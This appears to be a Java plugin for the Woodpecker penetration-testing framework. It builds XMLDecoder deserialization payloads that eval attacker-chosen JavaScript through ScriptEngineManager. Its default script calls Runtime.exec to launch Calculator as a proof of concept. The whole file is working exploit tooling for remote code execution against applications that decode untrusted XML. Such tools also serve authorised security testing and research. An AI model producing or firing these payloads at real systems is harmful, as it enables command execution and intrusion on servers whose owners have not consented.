package me.gv7.woodpecker.plugin.payloads;

import me.gv7.woodpecker.plugin.*;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class EvalJavaScriptPayloadGenerator implements IHelper {
    public String getHelperTabCaption() {
        return "evil javascript";
    }

    public IArgsUsageBinder getHelperCutomArgs() {
        IArgsUsageBinder argsUsageBinder = XMLDecoderPlugin.pluginHelper.createArgsUsageBinder();
        List<IArg> args = new ArrayList<IArg>();
        IArg argHost = XMLDecoderPlugin.pluginHelper.createArg();
        argHost.setName("all");
        argHost.setType(IArg.ARG_TYPE_STRING);
        argHost.setDefaultValue("java.lang.Runtime.getRuntime().exec('open /System/Applications/Calculator.app');");
        argHost.setDescription("javascript代码");
        argHost.setRequired(true);
        args.add(argHost);

        argsUsageBinder.setArgsList(args);
        return argsUsageBinder;
    }

    public void doHelp(Map<String, Object> customArgs, IResultOutput resultOutput) throws Throwable {
        String javascript = (String)customArgs.get("all");
        String payload = String.format("<java>\n" +
                "    <new class=\"javax.script.ScriptEngineManager\">\n" +
                "        <void method=\"getEngineByName\">\n" +
                "            <string>js</string>\n" +
                "            <void method=\"eval\">\n" +
                "                <string><![CDATA[%s]]></string>\n" +
                "            </void>\n" +
                "        </void>\n" +
                "    </new>\n" +
                "</java>",javascript);

        resultOutput.rawPrintln("\n" + payload + "\n");
    }
}
